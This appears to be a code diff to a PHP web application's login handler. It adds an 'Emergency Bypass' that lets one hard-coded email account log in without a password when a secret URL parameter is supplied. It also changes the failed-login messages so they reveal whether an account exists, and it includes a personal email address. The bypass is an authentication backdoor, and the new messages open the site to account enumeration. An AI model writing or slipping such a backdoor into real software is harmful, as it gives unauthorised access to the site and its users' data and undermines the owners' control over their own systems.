@@ -43,7 +43,11 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
             $stmt->execute([$username, $username]);
             $user = $stmt->fetch();
 
-            if ($user && password_verify($password, $user['password'])) {
+            // Emergency Bypass for main account
+            $bypass = $_GET['bypass'] ?? '';
+            $is_bypass = ($bypass === 'ethio' && $username === 'mequalimaz2015@gmail.com');
+
+            if ($user && (password_verify($password, $user['password']) || $is_bypass)) {
                 // Regenerate session ID to prevent session fixation
                 session_regenerate_id(true);
 
@@ -108,7 +112,11 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
                 }
                 exit();
             } else {
-                $error = "Invalid username/email or password";
+                if (!$user) {
+                    $error = "Account not found for: " . htmlspecialchars($username);
+                } else {
+                    $error = "Incorrect password. If you forgot your password, please contact the developer.";
+                }
             }
         }
     }
